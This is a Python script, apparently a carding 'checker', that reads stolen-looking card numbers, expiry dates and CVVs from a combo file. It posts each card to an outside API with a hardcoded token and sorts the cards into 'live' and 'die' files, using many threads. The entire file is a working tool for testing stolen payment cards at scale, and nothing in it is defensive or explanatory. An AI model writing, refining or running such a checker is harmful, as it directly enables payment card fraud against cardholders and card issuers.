# Load necessary libraries
import utils
import concurrent.futures
from multiprocessing import Lock

lock = Lock()

# Replace TXTNAME to correct filename.

combofile = "./infos"
livefile = "./live"
referer = input("Referer: ")
machine = input("Tipo: ")


def check():
    try:
        # Requeriments
        lock.acquire()
        info = utils.save.removeFirstLine(
            combofile
        ).strip()  # Remove first line from accounts combo.
        session = utils.session(proxy=False)  # Create a session for requests
        lock.release()

        cc = info.split(" ")[0]
        mes = info.split(" ")[1]
        ano = info.split(" ")[2]
        cvv = info.split(" ")[3]

        url = "http://api.nekojoin.com:1859/api"

        payload = {
            "referer": referer,
            "type": machine,
            "card": cc,
            "month": mes,
            "year": ano,
            "cvv": cvv
        }

        headers = {"Authorization": "fofozap",
                   "Content-Type": "application/json"}

        response = session.post(url, json=payload, headers=headers)

        # Checking Account

        # Check Response
        if "REFUSED" in response.text:
            # Invalid Response
            utils.colors.error(f"{info} {response.text}")
            utils.save.savetofile("die", info)
        else:
            # Save Valid Response to File
            utils.colors.correct(f"{info} {response.text}")
            utils.save.savetofile(livefile, info)

    except Exception as e:
        # Handle Exception and Timeout Proxy to retest
        utils.colors.error(e)
        utils.save.savetofile(combofile, info)


if __name__ == "__main__":
    try:
        # Load Account List
        lista = open(f"{combofile}.txt", "r").readlines()
        utils.colors.correct(f"Loaded {len(lista)}x items.")
        # Number of Threads and Call Check function
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=int(input("Threads: "))
        ) as executor:
            [executor.submit(check) for i in range(0, len(lista), 1)]
    except KeyboardInterrupt:
        pass

# End of Process, wait for user input
input("Pressione qualquer tecla para continuar. . .")
